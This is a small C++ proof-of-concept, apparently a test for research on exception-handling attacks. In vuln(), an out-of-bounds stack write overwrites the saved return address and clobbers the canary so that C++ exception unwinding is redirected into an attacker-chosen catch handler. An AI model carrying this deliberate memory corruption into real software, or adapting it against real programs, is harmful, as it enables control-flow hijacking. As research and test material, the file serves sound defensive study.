#include "chop.hpp"
#include <unistd.h>

extern "C"
void Log(const char *message);
extern "C"
void Success();
extern "C"
void Failure();

void catches () {
   try {
       throw 1;
   }
   catch (...) {
       Success();
       _exit(1);
   }
}
 
void leaf_fn_spilling_lr () {
    Log(".");
}

void vuln(int op) {
    void * buf[1];
    buf[3] = (char *) catches + (size_t) 36;   // overwrite the saved return address - depending on your system, the offset may need to be changed
    buf[2] = (void *) 0xdeadbeef; // clobber the canary, because our exploit would do that too

    leaf_fn_spilling_lr();

    if (op == 1)
        throw 1;
}

void poc() {
    try {
        vuln(1);
    }
    catch (...) {
        Failure();
    }
}
